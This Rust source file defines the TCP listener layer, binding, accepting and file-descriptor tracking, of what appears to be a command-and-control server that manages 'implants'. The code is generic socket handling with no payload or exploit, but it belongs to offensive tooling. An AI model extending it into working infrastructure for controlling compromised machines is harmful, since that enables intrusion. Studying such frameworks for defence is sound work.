use std::{net::{SocketAddr, TcpListener, TcpStream}, os::unix::prelude::{RawFd, AsRawFd}, io::ErrorKind, sync::Mutex};

use super::cnc::Cnc;


pub struct CncNet<'a> {
    addr: SocketAddr,
    listener: Option<TcpListener>,
    cnc: &'a Mutex<Cnc>,
}

impl<'a> CncNet<'a> {
    pub fn new(ip: &str, port: u16, cnc: &'a Mutex<Cnc>) -> Self {
        CncNet { addr: format!("{}:{}", ip, port).parse().unwrap(), listener: None, cnc }
    }

    pub fn get_cnc(&mut self) -> &Mutex<Cnc> {
        self.cnc
    }

    pub fn get_fd(&self) -> RawFd {
        match &self.listener {
            Some(listener) => listener.as_raw_fd(),
            None => -1
        }
    }

    pub fn get_max_fd(&self) -> RawFd {
        self.cnc.lock().unwrap().get_implants().iter().fold(self.get_fd(), |max, val| {
            match val.get_fd() > max {
                true => val.get_fd(),
                false => max
            }
        })
    }

    pub fn bind(&mut self) -> std::io::Result<()> {
        let listener = TcpListener::bind(&self.addr)?;
        listener.set_nonblocking(true)?;
        self.listener = Some(listener);
        Ok(()) 
    }

    pub fn accept(&self) -> Result<(TcpStream, SocketAddr), std::io::Error> {
        match &self.listener {
            Some(listener) => Ok(listener.accept()?),
            None => Err(std::io::Error::new(ErrorKind::Other, "The listener hasn't been initialized yet."))
        }
    } 
}